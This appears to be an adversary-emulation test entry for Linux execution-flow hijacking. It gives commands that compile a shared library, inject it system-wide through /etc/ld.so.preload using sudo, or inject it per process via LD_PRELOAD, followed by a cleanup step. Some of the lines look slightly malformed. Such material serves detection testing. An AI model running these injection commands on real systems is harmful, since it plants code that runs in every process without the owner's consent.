# Hijack Execution Flow

Get Prereq Commands:  
```
gcc -shared -fPIC ./inject_lib.c -o inject_lib.so -ldl  
```
  
# Shared Library Injection via /etc/ld.so.preload  
Attack Commands:
```
sudo sh -c 'echo /tmp/inject_lib.so > /etc/ld.so.preload'
``` 
Cleanup Commands:
```
sudo sed -i 's##/tmp/inject_lib.so##' /etc/ld.so.preload  
```

# Shared Library Injection via LD_PRELOAD  
Attack Commands:
```
LD_PRELOAD=#/tmp/inject_lib.so ls  
```
